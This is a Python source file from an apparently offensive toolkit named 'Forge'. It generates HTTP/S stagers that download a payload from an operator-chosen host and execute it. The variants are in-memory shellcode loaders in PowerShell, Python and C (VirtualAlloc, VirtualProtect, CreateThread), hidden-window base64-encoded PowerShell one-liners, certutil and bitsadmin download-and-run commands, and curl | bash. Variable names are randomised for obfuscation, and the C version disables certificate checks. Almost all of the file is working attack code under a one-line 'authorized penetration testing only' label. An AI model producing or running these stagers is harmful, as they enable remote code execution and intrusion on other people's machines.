"""HTTP/S Stager — download and execute a stage payload over HTTP(S).

Generates small stagers in multiple forms:
  - PowerShell (IWR / Net.WebClient / WinHTTP COM)
  - cmd.exe (certutil / bitsadmin / mshta)
  - Python (urllib)
  - C (WinHTTP, compiles to tiny EXE)
  - bash (curl | bash)

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import base64
import secrets
import textwrap


class HttpStager:
    """HTTP/S stager generator."""

    def __init__(
        self,
        lhost: str = "127.0.0.1",
        lport: int = 8080,
        stage_path: str = "/stage",
        ssl: bool = False,
        user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    ):
        self.lhost      = lhost
        self.lport      = lport
        self.stage_path = stage_path
        self.ssl        = ssl
        self.ua         = user_agent
        proto = "https" if ssl else "http"
        self.stage_url  = f"{proto}://{lhost}:{lport}{stage_path}"

    # ── Public API ─────────────────────────────────────────────────────

    def powershell_iwr(self, obfuscate: bool = True) -> tuple[bytes, str]:
        """PowerShell Invoke-WebRequest stager."""
        script = self._ps_iwr(obfuscate)
        oneliner = self._ps_encode(script)
        return script.encode(), oneliner

    def powershell_webclient(self, obfuscate: bool = True) -> tuple[bytes, str]:
        """PowerShell Net.WebClient DownloadString stager."""
        script = self._ps_webclient(obfuscate)
        oneliner = self._ps_encode(script)
        return script.encode(), oneliner

    def certutil(self) -> tuple[bytes, str]:
        """certutil.exe -urlcache LOLBin stager."""
        script, oneliner = self._cmd_certutil()
        return script.encode(), oneliner

    def bitsadmin(self) -> tuple[bytes, str]:
        """bitsadmin.exe /transfer LOLBin stager."""
        script, oneliner = self._cmd_bitsadmin()
        return script.encode(), oneliner

    def python_stager(self) -> tuple[bytes, str]:
        """Python urllib stager."""
        script = self._python_stager()
        oneliner = f"python3 -c \"{script.splitlines()[0]}\""
        return script.encode(), oneliner

    def curl_bash(self) -> tuple[bytes, str]:
        """curl | bash stager (Linux)."""
        oneliner = f"curl -fsSL '{self.stage_url}' | bash"
        return oneliner.encode(), oneliner

    def c_winhttp(self, arch: str = "x64") -> tuple[bytes, str]:
        """Tiny C WinHTTP stager (compile with MinGW)."""
        src = self._c_winhttp_src(arch)
        arch_prefix = "x86_64" if arch == "x64" else "i686"
        oneliner = (f"{arch_prefix}-w64-mingw32-gcc -o stager.exe stager.c "
                    f"-lwinhttp -s -O2 -mwindows")
        return src.encode(), oneliner

    def all_stagers(self) -> dict[str, tuple[bytes, str]]:
        """Return all stager variants."""
        return {
            "ps_iwr":      self.powershell_iwr(),
            "ps_webclient": self.powershell_webclient(),
            "certutil":    self.certutil(),
            "bitsadmin":   self.bitsadmin(),
            "python":      self.python_stager(),
            "curl_bash":   self.curl_bash(),
            "c_winhttp_x64": self.c_winhttp("x64"),
        }

    # ── PowerShell stagers ─────────────────────────────────────────────

    def _ps_iwr(self, obfuscate: bool) -> str:
        url = self.stage_url
        v1  = ("$" + secrets.token_hex(3)) if obfuscate else "$r"
        v2  = ("$" + secrets.token_hex(3)) if obfuscate else "$m"
        v3  = ("$" + secrets.token_hex(3)) if obfuscate else "$t"

        return textwrap.dedent(f"""\
        # Forge HTTP Stager — Invoke-WebRequest
        # Stage URL: {url}
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        {v1} = (Invoke-WebRequest -Uri '{url}' -UseBasicParsing -UserAgent '{self.ua}').Content
        $k = Add-Type -MemberDefinition @'
            [DllImport("kernel32")]
            public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr b,uint c,uint d);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr a,UIntPtr b,uint c,out uint d);
            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(IntPtr a,UIntPtr b,IntPtr c,IntPtr d,uint e,IntPtr f);
            [DllImport("kernel32")]
            public static extern uint WaitForSingleObject(IntPtr h,uint ms);
        '@ -Name 'S{secrets.token_hex(3)}' -Namespace 'F' -PassThru
        {v2} = $k::VirtualAlloc(0,[UIntPtr]{v1}.Length,0x3000,0x04)
        [System.Runtime.InteropServices.Marshal]::Copy({v1},0,{v2},{v1}.Length)
        $o=0; $k::VirtualProtect({v2},[UIntPtr]{v1}.Length,0x20,[ref]$o)|Out-Null
        {v3} = $k::CreateThread(0,0,{v2},0,0,0)
        $k::WaitForSingleObject({v3},0xFFFFFFFF)|Out-Null
        """)

    def _ps_webclient(self, obfuscate: bool) -> str:
        url = self.stage_url
        v1  = ("$" + secrets.token_hex(3)) if obfuscate else "$sc"

        return textwrap.dedent(f"""\
        # Forge HTTP Stager — Net.WebClient
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        {v1} = (New-Object Net.WebClient).DownloadData('{url}')
        $k = Add-Type -MemberDefinition @'
            [DllImport("kernel32")]
            public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr b,uint c,uint d);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr a,UIntPtr b,uint c,out uint d);
            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(IntPtr a,UIntPtr b,IntPtr c,IntPtr d,uint e,IntPtr f);
            [DllImport("kernel32")]
            public static extern uint WaitForSingleObject(IntPtr h,uint ms);
        '@ -Name 'W{secrets.token_hex(3)}' -Namespace 'F' -PassThru
        $m = $k::VirtualAlloc(0,[UIntPtr]{v1}.Length,0x3000,0x04)
        [System.Runtime.InteropServices.Marshal]::Copy({v1},0,$m,{v1}.Length)
        $o=0; $k::VirtualProtect($m,[UIntPtr]{v1}.Length,0x20,[ref]$o)|Out-Null
        $t=$k::CreateThread(0,0,$m,0,0,0)
        $k::WaitForSingleObject($t,0xFFFFFFFF)|Out-Null
        """)

    def _ps_encode(self, script: str) -> str:
        b64 = base64.b64encode(script.encode("utf-16-le")).decode()
        return (f"powershell.exe -NonInteractive -WindowStyle Hidden "
                f"-EncodedCommand {b64}")

    # ── LOLBin stagers ─────────────────────────────────────────────────

    def _cmd_certutil(self) -> tuple[str, str]:
        tmp = f"C:\\Windows\\Temp\\{secrets.token_hex(4)}.b64"
        exe = f"C:\\Windows\\Temp\\{secrets.token_hex(4)}.exe"
        script = textwrap.dedent(f"""\
        @echo off
        REM Forge HTTP Stager — certutil LOLBin
        REM FOR AUTHORIZED PENETRATION TESTING ONLY.
        certutil.exe -urlcache -split -f "{self.stage_url}" "{tmp}"
        certutil.exe -decode "{tmp}" "{exe}"
        del /f "{tmp}"
        start /b "" "{exe}"
        """)
        oneliner = (f'cmd.exe /c certutil.exe -urlcache -split -f "{self.stage_url}" '
                    f'"{tmp}" && certutil.exe -decode "{tmp}" "{exe}" && "{exe}"')
        return script, oneliner

    def _cmd_bitsadmin(self) -> tuple[str, str]:
        exe = f"C:\\Windows\\Temp\\{secrets.token_hex(4)}.exe"
        job = secrets.token_hex(4)
        script = textwrap.dedent(f"""\
        @echo off
        REM Forge HTTP Stager — bitsadmin LOLBin
        REM FOR AUTHORIZED PENETRATION TESTING ONLY.
        bitsadmin /transfer {job} /priority high "{self.stage_url}" "{exe}"
        start /b "" "{exe}"
        """)
        oneliner = (f'cmd.exe /c bitsadmin /transfer {job} /priority high '
                    f'"{self.stage_url}" "{exe}" && "{exe}"')
        return script, oneliner

    # ── Python ─────────────────────────────────────────────────────────

    def _python_stager(self) -> str:
        url = self.stage_url
        return textwrap.dedent(f"""\
        # Forge HTTP Stager — Python
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        import urllib.request, ctypes, sys
        data = urllib.request.urlopen('{url}').read()
        buf  = (ctypes.c_char * len(data))(*data)
        mem  = ctypes.windll.kernel32.VirtualAlloc(0,len(data),0x3000,0x04)
        ctypes.cdll.msvcrt.memcpy(mem,buf,len(data))
        ctypes.windll.kernel32.VirtualProtect(mem,len(data),0x20,ctypes.byref(ctypes.c_uint(0)))
        t = ctypes.windll.kernel32.CreateThread(0,0,mem,0,0,0)
        ctypes.windll.kernel32.WaitForSingleObject(t,0xFFFFFFFF)
        """)

    # ── C WinHTTP ──────────────────────────────────────────────────────

    def _c_winhttp_src(self, arch: str) -> str:
        url  = self.stage_url
        host = self.lhost
        port = self.lport
        path = self.stage_path
        arch_flag = "" if arch == "x64" else " -m32"
        arch_pre  = "x86_64" if arch == "x64" else "i686"

        return textwrap.dedent(f"""\
        /*
         * Forge HTTP Stager — C WinHTTP ({arch})
         * Stage URL: {url}
         * Compile: {arch_pre}-w64-mingw32-gcc -o stager.exe stager.c \\
         *          -lwinhttp -s -O2{arch_flag} -mwindows
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #define WIN32_LEAN_AND_MEAN
        #include <windows.h>
        #include <winhttp.h>
        #pragma comment(lib, "winhttp.lib")

        #define LHOST L"{host}"
        #define LPORT {port}
        #define PATH  L"{path}"
        #define MAX_STAGE (32*1024*1024)

        int WINAPI WinMain(HINSTANCE h,HINSTANCE p,LPSTR a,int s) {{
            HINTERNET sess = WinHttpOpen(L"{self.ua}",
                WINHTTP_ACCESS_TYPE_NO_PROXY,NULL,NULL,0);
            HINTERNET conn = WinHttpConnect(sess,LHOST,LPORT,0);
            DWORD flags = {'WINHTTP_FLAG_SECURE' if self.ssl else '0'};
            HINTERNET req  = WinHttpOpenRequest(conn,L"GET",PATH,NULL,NULL,NULL,flags);
            {'WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS, &(DWORD){SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS}, sizeof(DWORD));' if self.ssl else ''}
            WinHttpSendRequest(req,NULL,0,NULL,0,0,0);
            WinHttpReceiveResponse(req,NULL);
            LPVOID buf = VirtualAlloc(NULL,MAX_STAGE,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
            DWORD total=0,read=0;
            while(WinHttpReadData(req,(LPBYTE)buf+total,4096,&read)&&read) total+=read;
            WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(sess);
            if(!total) return 1;
            DWORD old; VirtualProtect(buf,total,PAGE_EXECUTE_READ,&old);
            ((void(*)())buf)();
            return 0;
        }}
        """)
